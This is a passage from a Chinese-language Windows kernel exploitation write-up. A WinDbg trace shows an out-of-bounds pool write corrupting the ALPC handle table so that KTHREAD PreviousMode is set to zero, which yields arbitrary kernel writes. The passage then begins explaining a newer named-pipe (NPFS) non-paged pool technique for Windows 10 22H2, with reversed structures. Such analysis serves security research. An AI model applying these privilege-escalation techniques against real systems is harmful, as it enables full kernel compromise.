
```
bp poolqudong!CommandCopy
0: kd> r
rax=ffffa307188e4e20 rbx=ffffa307188e4e20 rcx=ffffa3071b7b96c0
rdx=ffffa307188e4e20 rsi=0000000000000001 rdi=ffffa3071b6f6be0
rip=fffff800588b10e0 rsp=ffffc80c431527a8 rbp=0000000000000002
r8=000000000000000e r9=ffffa3071a00e820 r10=fffff800588b1510
r11=0000000000000000 r12=0000000000000000 r13=0000000000000000
r14=ffffa3071b6f6be0 r15=ffffa3071a00e820
iopl=0 nv up ei ng nz na po nc
cs=0010 ss=0018 ds=002b es=002b fs=0053 gs=002b efl=00040286
poolqudong!CommandCopy:
fffff800`588b10e0 48894c2408 mov qword ptr [rsp+8],rcx ss:0018:ffffc80c`431527b0=ffffa307188e4e20
0: kd> dq rcx
ffffa307`1b7b96c0 00000000`00000010 ffffcc83`0aac2004
ffffa307`1b7b96d0 000000e8`a6afe078 00000000`00000000
//查看_ALPC_HANDLE_TABLE
4: kd> dq ffffcc83`0aac3000
ffffcc83`0aac3000 000001f3`6df31870 000001f3`6df32bc0
ffffcc83`0aac3010 ffffcc83`81470570 ffffcc83`8146fd20
//_KALPC_RESERVE指向用户态结构体
4: kd> dt nt!_KALPC_RESERVE 000001f3`6df31870
+0x000 OwnerPort : (null)
+0x008 HandleTable : (null)
+0x010 Handle : (null)
+0x018 Message : 0x000001f3`6df318e0 _KALPC_MESSAGE
+0x020 Size : 0x40
+0x028 Active : 0n0
4: kd> dx -id 0,0,ffffa3071755c080 -r1 ((ntkrnlmp!_KALPC_MESSAGE *)0x1f36df318e0)
((ntkrnlmp!_KALPC_MESSAGE *)0x1f36df318e0) : 0x1f36df318e0 [Type: _KALPC_MESSAGE *]
[+0x000] Entry [Type: _LIST_ENTRY]
[+0x010] PortQueue : 0x0 [Type: _ALPC_PORT *]
[+0x018] OwnerPort : 0x0 [Type: _ALPC_PORT *]
[+0x020] WaitingThread : 0x0 [Type: _ETHREAD *]
[+0x028] u1 [Type: <anonymous-tag>]
[+0x02c] SequenceNo : 0 [Type: long]
[+0x030] QuotaProcess : 0x0 [Type: _EPROCESS *]
[+0x030] QuotaBlock : 0x0 [Type: void *]
[+0x038] CancelSequencePort : 0x0 [Type: _ALPC_PORT *]
[+0x040] CancelQueuePort : 0x0 [Type: _ALPC_PORT *]
[+0x048] CancelSequenceNo : 0 [Type: long]
[+0x050] CancelListEntry [Type: _LIST_ENTRY]
[+0x060] Reserve : 0x1f36df31870 [Type: _KALPC_RESERVE *]
[+0x068] MessageAttributes [Type: _KALPC_MESSAGE_ATTRIBUTES]
[+0x0b0] DataUserVa : 0x1f36df31f40 [Type: void *]
[+0x0b8] CommunicationInfo : 0x0 [Type: _ALPC_COMMUNICATION_INFO *]
[+0x0c0] ConnectionPort : 0x0 [Type: _ALPC_PORT *]
[+0x0c8] ServerThread : 0x0 [Type: _ETHREAD *]
[+0x0d0] WakeReference : 0x0 [Type: void *]
[+0x0d8] WakeReference2 : 0x0 [Type: void *]
//写入地址msg->ExtensionBuffer = (LPVOID)(ullKThreadAddress + dwThreadPreModePos);
[+0x0e0] ExtensionBuffer : 0xffffa3071adf12b2 [Type: void *]
[+0x0e8] ExtensionBufferSize : 0x20 [Type: unsigned __int64]
[+0x0f0] PortMessage [Type: _PORT_MESSAGE]
//对写入的地址下硬件断点
ba w1 0xffffa3071adf12b2;
3: kd> r
rax=ffffa3071adf12b2 rbx=000001f36df318e0 rcx=ffffa3071adf12b2
rdx=0000000000000000 rsi=000001f36df318e0 rdi=0000000000000008
rip=fffff8005420d4da rsp=ffffc80c43152738 rbp=ffffa3071b6cdaa0
r8=0000000000000008 r9=0000000000000001 r10=7ffffffffffffffc
r11=0000000000000000 r12=0000000000000020 r13=0000000000000000
r14=000001f36e070038 r15=0000000000000018
iopl=0 nv up ei ng nz na pe cy
cs=0010 ss=0018 ds=002b es=002b fs=0053 gs=002b efl=00040283
nt!memcpy+0x1a:
fffff800`5420d4da 4a895401f8 mov qword ptr [rcx+r8-8],rdx ds:002b:ffffa307`1adf12b2=0000000000000000
3: kd> kv
# Child-SP RetAddr : Args to Child : Call Site
00 ffffc80c`43152738 fffff800`5448b337 : 00000000`00000000 fffff800`5400b27e ffffcc83`08621f40 00000000`00000000 : nt!memcpy+0x1a
01 ffffc80c`43152740 fffff800`5448a865 : 000001f3`6df318e0 ffffffff`ffffffff 00000000`00000000 00000000`00000000 : nt!AlpcpCaptureMessageDataSafe+0x197
02 ffffc80c`43152780 fffff800`5448a62d : ffffc80c`43152a00 ffffa307`1b6cda00 ffffa307`00000000 fffff800`544e7bbf : nt!AlpcpCompleteDispatchMessage+0x155
03 ffffc80c`43152830 fffff800`5448a386 : 00000000`00000000 ffffa307`1adf1080 00000000`80000010 00000000`00000000 : nt!AlpcpDispatchNewMessage+0x25d
04 ffffc80c`43152890 fffff800`5448731a : ffffc80c`43152a30 000001f3`6e070010 00000000`00000000 000001f3`6e0a1001 : nt!AlpcpSendMessage+0x9f6
05 ffffc80c`431529d0 fffff800`5420bfb5 : ffffa307`1adf1080 ffffc80c`43152b80 000000e8`a6afcfc8 ffffc80c`43152aa8 : nt!NtAlpcSendWaitReceivePort+0x21a
06 ffffc80c`43152a90 00007ffc`4f78dee4 : 00007ff6`332df90e 000001f3`6e070010 00000000`00000500 000000e8`a6afcff0 : nt!KiSystemServiceCopyEnd+0x25 (TrapFrame @ ffffc80c`43152b00)
```

对越界写函数`poolqudong!CommandCopy`下断点展开，查看`_ALPC_HANDLE_TABLE`地址``ffffcc83`0aac3000``可以看到句柄表的前2个句柄已经被修改为``000001f3`6df31870``，指向`_KALPC_RESERVE`用户态结构体，里面`ExtensionBuffer`指向了`Kthread`结构体`+0x232`是`PreMode`位置`ffffa3071adf12b2`，在`nt!AlpcpCaptureMessageDataSafe`中被从原值1修改为0，这样就可以实现用`NtWriteVirtualMemory`写内核态内存了，至此完成了漏洞的利用。

## 非分页模式利用分析

原作者<a href="elink@7c8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6$3M7o6M7%4y4#2)9J5c8W2N6A6L8X3c8G2N6%4y4Q4x3X3c8z5L8$3&6Q4x3X3c8b7j5h3N6W2k6q4)9J5k6q4m8G2L8$3I4Q4x3X3c8a6N6X3g2J5k6X3I4G2N6#2)9J5k6p5g2^5M7r3I4G2K9i4c8S2N6r3W2G2L8R3`.`.">非分页内存利用工具</a>项目过去年代久远，笔者未在最新版windows系统上复现利用，不过笔者通过逆向命名管道驱动`NPFS.SYS`具体实现细节，发现了一种全新的可以适用于最新版Windows 10 22h2利用方式。这种利用方式相当巧妙，只需要越界写入`0x18`个已知可控内容字节数据，就可以实现完美利用，利用成功后可以正常退出进程，不影响已申请的内核态内存释放。

命名管道的后端实现在一个名为`NPFS.SYS`驱动中，模块的主要实现和公开的<a href="elink@d4cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8%4S2&6k6$3g2F1i4K6u0W2M7X3g2S2j5%4c8G2M7#2)9J5k6h3!0J5k6#2)9J5c8X3c8A6M7W2)9#2k6U0f1#2x3X3p5%4y4K6R3%4z5r3c8X3z5e0x3K6x3U0k6T1j5X3f1#2x3e0k6T1k6h3g2X3k6r3x3H3z5r3t1J5i4K6u0W2K9s2c8E0L8l9`.`.">npfs模块reactos源码</a>基本上大致相同，只不过多了一些细节上的优化，通过逆向驱动对比源码分析我们得到了如下的2个数据结构

```
typedef struct _DATA_QUEUE_ENTRY{
    LIST_ENTRY Queue;
    _IRP* Irp;
    __int64 SecurityContext;
    int EntryType;
    int QuotaInEntry;
    int DataSize;
    int x;
} DATA_QUEUE_ENTRY, *PDATA_QUEUE_ENTRY;

typedef struct _NP_DATA_QUEUE
{
    LIST_ENTRY Queue;
    ULONG QueueState;
    ULONG BytesInQueue;
    ULONG EntriesInQueue;
    ULONG QuotaUsed;
    ULONG ByteOffset;
    ULONG Quota;
} NP_DATA_QUEUE, *PNP_DATA_QUEUE;

//nSize指定了pipe的最大容量
BOOL CreatePipe(
    [out] PHANDLE hReadPipe,
    [out] PHANDLE hWritePipe,
    [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,
    [in] DWORD nSize
);
```

以通过<a href="elink@736K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6D9k6h3q4J5L8W2)9J5k6h3#2A6j5%4u0G2M7$3!0X3N6q4)9J5k6h3y4G2L8g2)9J5c8X3g2F1i4K6u0V1N6i4y4Q4x3V1k6%4K9h3&6V1L8%4N6K6i4K6u0r3N6$3W2F1x3K6u0Q4x3V1k6S2M7r3W2Q4x3V1k6F1j5h3#2W2k6s2m8A6M7r3g2S2M7r3W2Q4x3V1k6F1k6W2)9J5k6r3&6S2L8h3g2V1M7r3W2H3k6h3q4H3K9g2)9J5k6r3y4J5k6h3q4@1k6i4m8A6M7r3f1`.">CreatePipe</a>创建命名管道文件对象为例，文件实例绑定了一个名为`NP_DATA_QUEUE`类型的队列对象，`CreatePipe`的参数`nSize`指定了当前pipe的最大容量或者说是允许最大缓冲区长度，每对pipe进行一次读写操作就会增加一个`DATA_QUEUE_ENTRY`，若干次写可以对应若干次读，当存在读数据的请求时irp就会挂起，直到写入请求的数据量达到读取请求的数据量才会完成整个读取irp请求，比如说pipe的容量是1000，第一次写了1000的数据，这个写请求会返回，第二次又写了1000数据那么这个请求就一直挂起，直到读取了1000数据后，最后写入的数据小于或等于pipe的容量，后面写请求才会返回。对于读请求也是同理，这里不再赘述。
